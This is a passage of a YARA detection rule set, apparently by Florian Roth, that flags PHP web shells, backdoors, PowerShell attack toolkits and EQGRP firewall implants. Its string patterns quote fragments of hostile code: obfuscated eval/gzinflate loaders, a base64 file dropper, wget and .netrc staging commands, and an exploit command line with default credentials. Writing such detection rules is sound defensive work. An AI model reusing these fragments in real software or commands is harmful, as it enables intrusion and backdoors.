      ( uint16 ( 0 ) == 0x6324 and filesize < 6KB and ( all of ( $s* ) ) ) or ( all of them )
}

rule DkShell_4000bd83451f0d8501a9dfad60dce39e55ae167d_RID352C : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:01:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "51a16b09520a3e063adf10ff5192015729a5de1add8341a43da5326e626315bd"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "DK Shell - Took the Best made it Better..!!" fullword ascii
      $x2 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
      $x3 = "echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';" fullword ascii
      $s1 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      $s9 = "$x = $_GET[\"x\"];" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c and filesize < 200KB and 1 of ( $x* ) ) or ( 3 of them )
}

rule WebShell_5786d7d9f4b0df731d79ed927fb5a124195fc901_RID355F : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:10:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b1733cbb0eb3d440c4174cc67ca693ba92308ded5fc1069ed650c3c78b1da4bc"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "preg_replace(\"\\x2F\\x2E\\x2A\\x2F\\x65\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x" ascii
      $s2 = "input[type=text], input[type=password]{" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x6c3c and filesize < 80KB and all of them )
}

rule Unknown_0f06c5d1b32f4994c3b3abf8bb76d5468f105167_RID3522 : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:00:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6362372850ac7455fa9461ed0483032a1886543f213a431f81a2ac76d383b47e"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/libraries/lola.php\" ;" fullword ascii
      $s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
      $s3 = "fwrite($fp,base64_decode('" ascii
   condition: 
      ( uint16 ( 0 ) == 0x6324 and filesize < 2KB and all of them )
}

rule WSOShell_0bbebaf46f87718caba581163d4beed56ddf73a7_2_RID36D5 : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 17:12:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d053086907aed21fbb6019bf9e644d2bae61c63563c4c3b948d755db3e78f395"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s8 = "$default_charset='Wi'.'ndo.'.'ws-12'.'51';" fullword ascii
      $s9 = "$mosimage_session = \"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c and filesize < 300KB and all of them )
}

rule WebShell_Generic_1609_A_RID2F12 : DEMO FILE GEN T1505_003 WEBSHELL {
   meta:
      description = "Detects a PHP webshell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 11:41:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c817a490cfd4d6377c15c9ac9bcfa136f4a45ff5b40c74f15216c030f657d035"
      hash3 = "69b9d55ea2eb4a0d9cfe3b21b0c112c31ea197d1cb00493d1dddc78b90c5745e"
      tags = "DEMO, FILE, GEN, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "return $qwery45234dws($b);" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c and 1 of them )
}

rule Pirpi_1609_B_RID2AE5 : DEMO EXE FILE G0022 MAL {
   meta:
      description = "Detects Pirpi Backdoor"
      author = "Florian Roth"
      reference = "https://community.broadcom.com/home"
      date = "2016-09-08 09:13:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "498b98c02e19f4b03dc6a3a8b6ff8761ef2c0fedda846ced4b6f1c87b52468e7"
      tags = "DEMO, EXE, FILE, G0022, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "tconn <ip> <port> //set temp connect value, and disconnect." fullword ascii
      $s2 = "E* ListenCheckSsl SslRecv fd(%d) Error ret:%d %d" fullword ascii
      $s3 = "%s %s L* ListenCheckSsl fd(%d) SslV(-%d-)" fullword ascii
      $s4 = "S:%d.%d-%d.%d V(%d.%d) Listen On %d Ok." fullword ascii
      $s5 = "E* ListenCheckSsl fd(%d) SslAccept Err %d" fullword ascii
      $s6 = "%s-%s N110 Ssl Connect Ok(%s:%d)." fullword ascii
      $s7 = "%s-%s N110 Basic Connect Ok(%s:%d)." fullword ascii
      $s8 = "tconn <ip> <port>" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them ) or ( 4 of them )
}

rule HKTL_Buckeye_Osinfo_Sep16_RID3026 : DEMO EXE FILE G0022 HKTL {
   meta:
      description = "Detects OSinfo tool used by the Buckeye APT group"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://www.symantec.com/connect/blogs/buckeye-cyberespionage-group-shifts-gaze-us-hong-kong"
      date = "2016-09-05 12:27:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      id = "e40a86d1-fd1a-5430-b7b7-8cc7ca128cc5"
      tags = "DEMO, EXE, FILE, G0022, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "-s ShareInfo ShareDir" fullword ascii
      $s2 = "-a Local And Global Group User Info" fullword ascii
      $s3 = "-f <infile> //input server list from infile, OneServerOneLine" fullword ascii
      $s4 = "info <\\server> <user>" fullword ascii
      $s5 = "-c Connect Test" fullword ascii
      $s6 = "-gd Group Domain Admins" fullword ascii
      $s7 = "-n NetuseInfo" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and 3 of ( $s* )
}

rule ps1_toolkit_Inveigh_BruteForce_RID3303 : DEMO FILE HKTL SCRIPT T1059_001 T1110 {
   meta:
      description = "Semiautomatically generated YARA rule - file Inveigh-BruteForce.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 14:29:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a2ae1e02bcb977cd003374f551ed32218dbcba3120124e369cc150b9a63fe3b8"
      tags = "DEMO, FILE, HKTL, SCRIPT, T1059_001, T1110"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Import-Module .\\Inveigh.psd1;Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 " fullword ascii
      $s2 = "$(Get-Date -format 's') - Attempting to stop HTTP listener\")|Out-Null" fullword ascii
      $s3 = "Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 -Hostname server1" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 300KB and 1 of them ) or ( 2 of them )
}

rule ps1_toolkit_Inveigh_BruteForce_2_RID3394 : DEMO FILE HKTL SCRIPT T1059_001 T1110 {
   meta:
      description = "Semiautomatically generated YARA rule - from files Inveigh-BruteForce.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 14:53:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a2ae1e02bcb977cd003374f551ed32218dbcba3120124e369cc150b9a63fe3b8"
      tags = "DEMO, FILE, HKTL, SCRIPT, T1059_001, T1110"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "}.NTLMv2_file_queue[0]|Out-File ${" ascii
      $s2 = "}.NTLMv2_file_queue.RemoveRange(0,1)" ascii
      $s3 = "}.NTLMv2_file_queue.Count -gt 0)" ascii
      $s4 = "}.relay_running = $false" ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
}

rule ps1_toolkit_PowerUp_2_RID2F4C : DEMO FILE HKTL SCRIPT T1059_001 T1087_001 {
   meta:
      description = "Semiautomatically generated YARA rule - from files PowerUp.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 11:51:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "fc65ec85dbcd49001e6037de9134086dd5559ac41ac4d1adf7cab319546758ad"
      tags = "DEMO, FILE, HKTL, SCRIPT, T1059_001, T1087_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "if($MyConString -like $([Text.Encoding]::Unicode.GetString([Convert]::" ascii
      $s2 = "FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA=')))) {" ascii
      $s3 = "$Null = Invoke-ServiceStart" ascii
      $s4 = "Write-Warning \"[!] Access to service $" ascii
      $s5 = "} = $MyConString.Split(\"=\")[1].Split(\";\")[0]" ascii
      $s6 = "} += \"net localgroup ${" ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 2000KB and 2 of them ) or ( 4 of them )
}

rule ps1_toolkit_Persistence_2_RID30FF : DEMO FILE HKTL SCRIPT T1059_001 {
   meta:
      description = "Semiautomatically generated YARA rule - from files Persistence.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 13:03:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e1a4dd18b481471fc25adea6a91982b7ffed1c2d393c8c17e6e542c030ac6cbd"
      tags = "DEMO, FILE, HKTL, SCRIPT, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBPAG4ASQBkAGwAZQA=')" ascii
      $s2 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBEAGEAaQBsAHkA')" ascii
      $s3 = "FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA==')" ascii
      $s4 = "[Parameter( ParameterSetName = 'ScheduledTaskAtLogon', Mandatory = $True )]" ascii
      $s5 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBBAHQATABvAGcAbwBuAA==')))" ascii
      $s6 = "[Parameter( ParameterSetName = 'PermanentWMIAtStartup', Mandatory = $True )]" fullword ascii
      $s7 = "FromBase64String('TQBlAHQAaABvAGQA')" ascii
      $s8 = "FromBase64String('VAByAGkAZwBnAGUAcgA=')" ascii
      $s9 = "[Runtime.InteropServices.CallingConvention]::Winapi," fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
}

rule ps1_toolkit_Inveigh_BruteForce_3_RID3395 : DEMO FILE HKTL SCRIPT T1059_001 T1110 {
   meta:
      description = "Semiautomatically generated YARA rule - from files Inveigh-BruteForce.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 14:54:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash3 = "a2ae1e02bcb977cd003374f551ed32218dbcba3120124e369cc150b9a63fe3b8"
      tags = "DEMO, FILE, HKTL, SCRIPT, T1059_001, T1110"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "::FromBase64String('TgBUAEwATQA=')" ascii
      $s2 = "::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))" ascii
      $s3 = "::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))" ascii
      $s4 = "::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))" ascii
      $s5 = "[Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`" fullword ascii
      $s6 = "KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA" ascii
      $s7 = "}.bruteforce_running)" ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
}

rule b374k_back_connect_RID2DB5 : APT DEMO EXE FILE T1068 {
   meta:
      description = "Detects privilege escalation tool"
      author = "Florian Roth"
      reference = "Internal Analysis"
      date = "2016-08-18 10:43:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c8e16f71f90bbaaef27ccaabb226b43762ca6f7e34d7d5585ae0eb2d36a4bae5"
      tags = "APT, DEMO, EXE, FILE, T1068"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "AddAtomACreatePro" fullword ascii
      $s2 = "shutdow" fullword ascii
      $s3 = "/config/i386" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 10KB and all of them )
}

rule APT_EQGRP_RC5_RC6_Opcode_RID2EE0 : APT DEMO {
   meta:
      description = "EQGRP Toolset Firewall - RC5 / RC6 opcode"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/incidents/75812/the-equation-giveaway/"
      date = "2016-08-17 11:33:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = { 8B 74 91 FC 81 EE 47 86 C8 61 89 34 91 42 83 FA 2B } 
   condition: 
      1 of them
}

rule APT_EQGRP_screamingplow_RID2FAE : APT DEMO SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file screamingplow.sh"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 12:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c7f4104c4607a03a1d27c832e1ebfc6ab252a27a1709015b5f1617b534f0090a"
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "What is the name of your PBD:" fullword ascii
      $s2 = "You are now ready for a ScreamPlow" fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_MixText_RID2D06 : APT DEMO SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file MixText.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:14:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e4d24e30e6cc3a0aa0032dbbd2b68c60bac216bef524eaf56296430aa05b3795"
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "BinStore enabled implants." fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_payload_RID2D1D : APT DEMO SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file payload.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "21bed6d699b1fbde74cbcec93575c9694d5bea832cd191f59eb3e4140e5c5e07"
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "can't find target version module!" fullword ascii
      $s2 = "class Payload:" fullword ascii
   condition: 
      all of them
}

rule APT_EQGRP_userscript_RID2E87 : APT DEMO {
   meta:
      description = "EQGRP Toolset Firewall - file userscript.FW"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:18:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5098ff110d1af56115e2c32f332ff6e3973fb7ceccbd317637c9a72a3baa43d7"
      tags = "APT, DEMO"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Are you sure? Don't forget that NETSCREEN firewalls require BANANALIAR!! " fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_uninstallPBD_RID2EE3 : APT DEMO SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file uninstallPBD.bat"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:33:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "692fdb449f10057a114cf2963000f52ce118d9a40682194838006c66af159bd0"
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "memset 00e9a05c 4 38845b88" fullword ascii
      $s2 = "_hidecmd" ascii
      $s3 = "memset 013abd04 1 0d" fullword ascii
   condition: 
      all of them
}

rule APT_EQGRP_callbacks_RID2DD3 : APT DEMO {
   meta:
      description = "EQGRP Toolset Firewall - Callback addresses"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "30.40.50.60:9342" fullword ascii wide
   condition: 
      1 of them
}

rule APT_EQGRP_Unique_Strings_RID2FF3 : APT DEMO {
   meta:
      description = "EQGRP Toolset Firewall - Unique strings"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 12:19:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "/BananaGlee/ELIGIBLEBOMB" ascii
      $s2 = "Protocol must be either http or https (Ex: https://1.2.3.4:1234)" 
   condition: 
      1 of them
}

rule APT_install_get_persistent_filenames_RID35AE : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - file install_get_persistent_filenames"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 16:23:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4a50ec4bf42087e932e9e67e0ea4c09e52a475d351981bb4c9851fda02b35291"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Generates the persistence file name and prints it out." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and all of them )
}

rule APT_EQGRP_tunnel_state_reader_RID321B : APT DEMO {
   meta:
      description = "EQGRP Toolset Firewall - file tunnel_state_reader"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 13:51:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "49d48ca1ec741f462fde80da68b64dfa5090855647520d29e345ef563113616c"
      tags = "APT, DEMO"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Active connections will be maintained for this tunnel. Timeout:" fullword ascii
      $s5 = "%s: compatible with BLATSTING version 1.2" fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_eligiblecandidate_RID310D : APT DEMO SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file eligiblecandidate.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 13:06:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c4567c00734dedf1c875ecbbd56c1561a1610bedb4621d9c8899acec57353d86"
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $o1 = "Connection timed out. Only a problem if the callback was not received." fullword ascii
      $o2 = "Could not reliably detect cookie. Using 'session_id'..." fullword ascii
      $c1 = "def build_exploit_payload(self,cmd=\"/tmp/httpd\"):" fullword ascii
      $c2 = "self.build_exploit_payload(cmd)" fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_networkProfiler_orderScans_RID34F3 : APT DEMO SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file networkProfiler_orderScans.sh"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 15:52:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ea986ddee09352f342ac160e805312e3a901e58d2beddf79cd421443ba8c9898"
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Unable to save off predefinedScans directory" fullword ascii
      $x2 = "Re-orders the networkProfiler scans so they show up in order in the LP" fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_epicbanana_2_1_0_1_RID3075 : APT DEMO SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file epicbanana_2.1.0.1.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 12:40:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4b13cc183c3aaa8af43ef3721e254b54296c8089a0cd545ee3b867419bb66f61"
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "failed to create version-specific payload" fullword ascii
      $s2 = "(are you sure you did \"make [version]\" in versions?)" fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_sniffer_xml2pcap_RID30A6 : APT DEMO T1040 {
   meta:
      description = "EQGRP Toolset Firewall - file sniffer_xml2pcap"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 12:48:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f5e5d75cfcd86e5c94b0e6f21bbac886c7e540698b1556d88a83cc58165b8e42"
      tags = "APT, DEMO, T1040"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "-s/--srcip <sourceIP>  Use given source IP (if sniffer doesn't collect source IP)" fullword ascii
      $x2 = "convert an XML file generated by the BLATSTING sniffer module into a pcap capture file." fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_BananaAid_RID2D82 : APT DEMO T1105 {
   meta:
      description = "EQGRP Toolset Firewall - file BananaAid"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:34:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7a4fb825e63dc612de81bc83313acf5eccaa7285afc05941ac1fef199279519f"
      tags = "APT, DEMO, T1105"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "(might have to delete key in ~/.ssh/known_hosts on linux box)" fullword ascii
      $x2 = "scp BGLEE-" ascii
      $x3 = "should be 4bfe94b1 for clean bootloader version 3.0; " fullword ascii
      $x4 = "scp <configured implant> <username>@<IPaddr>:onfig" fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_bo_RID2B04 : APT DEMO FILE {
   meta:
      description = "EQGRP Toolset Firewall - file bo"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 08:48:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "aa8b363073e8ae754b1836c30f440d7619890ded92fb5b97c73294b15d22441d"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "ERROR: failed to open %s: %d" fullword ascii
      $s2 = "__libc_start_main@@GLIBC_2.0" ascii
      $s3 = "serial number: %s" fullword ascii
      $s4 = "strerror@@GLIBC_2.0" fullword ascii
      $s5 = "ERROR: mmap failed: %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 20KB and all of them )
}

rule APT_EQGRP_config_jp1_UA_RID2F08 : APT DEMO {
   meta:
      description = "EQGRP Toolset Firewall - file config_jp1_UA.pl"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:39:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2f50b6e9891e4d7fd24cc467e7f5cfe348f56f6248929fec4bbee42a5001ae56"
      tags = "APT, DEMO"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "This program will configure a JETPLOW Userarea file." fullword ascii
      $x2 = "Error running config_implant." fullword ascii
      $x3 = "NOTE:  IT ASSUMES YOU ARE OPERATING IN THE INSTALL/LP/JP DIRECTORY. THIS ASSUMPTION " fullword ascii
      $x4 = "First IP address for beacon destination [127.0.0.1]" fullword ascii
   condition: 
      1 of them
}

rule APT_EQGRP_workit_RID2CD3 : APT DEMO SCRIPT T1105 {
   meta:
      description = "EQGRP Toolset Firewall - file workit.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:05:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-01-20"
      hash1 = "fb533b4d255b4e6072a4fa2e1794e38a165f9aa66033340c2f4f8fd1da155fac"
      tags = "APT, DEMO, SCRIPT, T1105"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "macdef init > /tmp/.netrc;" fullword ascii
      $s2 = "/usr/bin/wget http://" ascii
      $s3 = "HOME=/tmp ftp" fullword ascii
      $s4 = " >> /tmp/.netrc;" fullword ascii
      $s5 = "/usr/rapidstream/bin/tftp" fullword ascii
      $s6 = "created shell_command:" fullword ascii
      $s7 = "rm -f /tmp/.netrc;" fullword ascii
      $s8 = "echo quit >> /tmp/.netrc;" fullword ascii
      $s9 = "echo binary >> /tmp/.netrc;" fullword ascii
      $s10 = "chmod 600 /tmp/.netrc;" fullword ascii
      $s11 = "created cli_command:" fullword ascii
   condition: 
      6 of them
}

rule APT_EQGRP_tinyhttp_setup_RID3047 : APT DEMO FILE SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file tinyhttp_setup.sh"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 12:33:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3d12c83067a9f40f2f5558d3cf3434bbc9a4c3bb9d66d0e3c0b09b9841c766a0"
      tags = "APT, DEMO, FILE, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "firefox http://127.0.0.1:8000/$_name" fullword ascii
      $x2 = "What is the name of your implant:" fullword ascii
      $x3 = "killall thttpd" fullword ascii
      $x4 = "copy http://<IP>:80/$_name flash:/$_name" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 2KB and 1 of ( $x* ) ) or ( all of them )
}

rule APT_EQGRP_EPBA_RID2B4B : APT DEMO FILE SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file EPBA.script"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 09:00:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "53e1af1b410ace0934c152b5df717d8a5a8f5fdd8b9eb329a44d94c39b066ff7"
      tags = "APT, DEMO, FILE, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "./epicbanana_2.0.0.1.py -t 127.0.0.1 --proto=ssh --username=cisco --password=cisco --target_vers=asa804 --mem=NA -p 22 " fullword ascii
      $x2 = "-t TARGET_IP, --target_ip=TARGET_IP -- Either 127.0.0.1 or Win Ops IP" fullword ascii
      $x3 = "./bride-1100 --lp 127.0.0.1 --implant 127.0.0.1 --sport RHP --dport RHP" fullword ascii
      $x4 = "--target_vers=TARGET_VERS    target Pix version (pix712, asa804) (REQUIRED)" fullword ascii
      $x5 = "-p DEST_PORT, --dest_port=DEST_PORT defaults: telnet=23, ssh=22 (optional) - Change to LOCAL redirect port" fullword ascii
      $x6 = "this operation is complete, BananaGlee will" fullword ascii
      $x7 = "cd /current/bin/FW/BGXXXX/Install/LP" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2023 and filesize < 7KB and 1 of ( $x* ) ) or ( 3 of them )
}

rule APT_EQGRP_jetplow_SH_RID2E32 : APT DEMO SCRIPT {
   meta:
      description = "EQGRP Toolset Firewall - file jetplow.sh"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:04:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
